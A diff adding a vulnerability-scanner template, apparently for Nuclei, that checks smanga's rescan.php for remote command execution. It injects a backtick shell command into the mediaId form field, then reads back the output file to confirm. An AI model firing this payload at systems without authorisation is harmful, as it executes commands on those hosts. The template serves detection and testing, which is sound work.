@@ -1,0 +1,33 @@
+id: smanga-rescan_php-RCE
+
+info:
+  name: smanga rescan.php 远程命令执行漏洞
+  author: smanga
+  severity: high
+  tags: RCE
+
+variables:
+  username: "{{to_lower(rand_base(5))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /php/path/rescan.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        path=/tmp&mediaId=`id>{{username}}.txt`&pathId=1
+      - |
+        GET /php/path/{{username}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+      - type: status
+        status: 
+          - 200
